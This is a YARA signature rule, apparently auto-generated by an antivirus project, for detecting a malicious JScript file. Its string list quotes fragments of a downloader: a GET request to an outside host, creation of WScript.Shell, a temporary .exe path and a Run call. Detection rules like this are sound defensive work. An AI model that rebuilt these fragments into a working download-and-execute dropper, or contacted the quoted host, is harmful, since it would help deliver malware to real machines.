rule sig_20160330_e797fafefbb58a0c8ef422365b87793f {
  meta:
    description = "datamaliciousorder - file 20160330_e797fafefbb58a0c8ef422365b87793f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0ce14dc9ee83c217425c911326ed400808937448f13d7d8c23037728cfd6d8dd"

  strings:
    $s1  = "function P(M, SL){V = V * 1; return M - SL;};" fullword ascii
    $s2  = "PC[E](\"GET\", \"http://webkits.ru/mn3dka\", false);" fullword ascii
    $s3  = "var Z = function Q() {return WScript[N](\"WScript\"+\".Shell\");}(), QR = 11;" fullword ascii
    $s4  = "if (PC[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function G0(){return SO + \"\";};" fullword ascii
    $s6  = "function FH() {return Z[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"nOp8eb2AK8Vc4.ex\" + \"e\";};" fullword ascii
    $s7  = "function NR(JT){Z[\"Run\"](JT, V, V);};" fullword ascii
    $s8  = "function G() {return ((EV == true) && (EV == P1)) ? 1 : V;};" fullword ascii
    $s9  = "function X()" fullword ascii
    $s10 = "var X0 = new this[\"Date\"]();" fullword ascii
    $s11 = "}while (Y);" fullword ascii
    $s12 = "return P(F, P0);" fullword ascii
    $s13 = "function OK(){return N;};" fullword ascii
    $s14 = "function B(WH) {var D = (1, 2, 3, 4, 5, WH); return D;};" fullword ascii
    $s15 = "function KK(){return 22;};" fullword ascii
    $s16 = "var H = false;" fullword ascii
    $s17 = "var EV = false;" fullword ascii
    $s18 = "var P1 = false;" fullword ascii
    $s19 = "P1 = true; " fullword ascii
    $s20 = "EV = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}